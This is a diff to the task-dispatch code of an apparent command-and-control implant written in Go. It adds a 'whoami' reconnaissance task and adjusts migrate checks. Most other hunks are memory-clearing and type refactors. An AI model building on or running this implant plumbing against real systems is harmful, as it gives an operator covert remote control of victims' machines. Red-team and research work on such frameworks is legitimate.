@@ -19,7 +19,6 @@ package c2
 import (
 	"context"
 	"io"
-	"io/fs"
 	"os"
 	"syscall"
 	"time"
@@ -61,7 +60,8 @@ func muxHandleSpawnAsync(s *Session, n *com.Packet) {
 	}
 	w := &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
 	muxHandleSend(s, n, w, muxHandleSpawnSync(s, n, w))
-	w = nil
+	n.Clear()
+	w, n = nil, nil
 }
 func muxHandleScriptAsync(s *Session, n *com.Packet) {
 	if bugtrack.Enabled {
@@ -69,7 +69,8 @@ func muxHandleScriptAsync(s *Session, n *com.Packet) {
 	}
 	w := &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
 	muxHandleSend(s, n, w, muxHandleScript(s, n, w))
-	w = nil
+	n.Clear()
+	w, n = nil, nil
 }
 func defaultClientMux(s *Session, n *com.Packet) bool {
 	if n.ID < task.MvRefresh || n.ID == RvResult {
@@ -94,13 +95,16 @@ func defaultClientMux(s *Session, n *com.Packet) bool {
 		err = muxHandleInternal(s, n, w)
 	)
 	if err == nil && n.ID == task.MvMigrate {
-		if w = nil; cout.Enabled {
+		if w.Clear(); cout.Enabled {
 			s.log.Info("[%s/Mux] Migrate Job %d passed, not sending response back!", s.ID, n.Job)
 		}
+		n.Clear()
+		n, w = nil, nil
 		return true
 	}
 	muxHandleSend(s, n, w, err)
-	w = nil
+	n.Clear()
+	w, n = nil, nil
 	return true
 }
 func muxHandleExternalAsync(s *Session, n *com.Packet) {
@@ -117,6 +121,8 @@ func muxHandleExternalAsync(s *Session, n *com.Packet) {
 		}
 		w.Flags |= com.FlagError
 		muxHandleSend(s, n, w, nil)
+		n.Clear()
+		n = nil
 		return
 	}
 	if n.ID == task.TvWait {
@@ -124,13 +130,16 @@ func muxHandleExternalAsync(s *Session, n *com.Packet) {
 			s.log.Warning("[%s/MuX] Skipping non-Script WAIT Task!", s.ID)
 		}
 		muxHandleSend(s, n, w, nil)
+		n.Clear()
+		n = nil
 		return
 	}
 	if cout.Enabled {
 		s.log.Trace("[%s/MuX] Starting async Task for Job %d.", s.ID, n.Job)
 	}
 	muxHandleSend(s, n, w, t(s.ctx, n, w))
-	t = nil
+	n.Clear()
+	t, n = nil, nil
 }
 func muxHandleScript(s *Session, n, w *com.Packet) error {
 	if cout.Enabled {
@@ -277,8 +286,8 @@ func muxHandleInternal(s *Session, n *com.Packet, w data.Writer) error {
 			w.WriteInt64(s.ModTime().Unix())
 			return nil
 		}
-		var l []fs.DirEntry
-		if l, err = os.ReadDir(d); err != nil {
+		var l []data.DirEntry
+		if l, err = data.ReadDir(d); err != nil {
 			return err
 		}
 		w.WriteUint32(uint32(len(l)))
@@ -334,10 +343,9 @@ func muxHandleInternal(s *Session, n *com.Packet, w data.Writer) error {
 				return err1
 			}
 			if u == 0 {
-				s.kill = nil
+				s.kill = time.Time{}
 			} else {
-				d := time.Unix(u, 0)
-				s.kill = &d
+				s.kill = time.Unix(u, 0)
 			}
 		case timeWorkHours:
 			var w cfg.WorkHours
@@ -411,6 +419,15 @@ func muxHandleInternal(s *Session, n *com.Packet, w data.Writer) error {
 			return err
 		}
 		data.WriteStringList(w, m)
+		return nil
+	case task.MvWhoami:
+		u, err := device.Whoami()
+		if err != nil {
+			return err
+		}
+		e, _ := os.Executable()
+		w.WriteString(u)
+		w.WriteString(e)
 		return nil
 	case task.MvMigrate:
 		var (
@@ -600,7 +617,7 @@ func readCallable(x context.Context, m bool, r data.Reader) (cmd.Runnable, strin
 	}
 	// Check if we are Migrating (m == true) and if we have an empty filter first.
 	if m && f == nil || f.Empty() {
-		if _, ok := e.(*cmd.Process); !ok {
+		if _, ok := e.(*cmd.Assembly); ok {
 			// Refusing to run Migrate that is NOT A SEPARATE process WITHOUT A
 			// non-empty/nil Filter.
 			// This will cause migrate to go through and then crash.
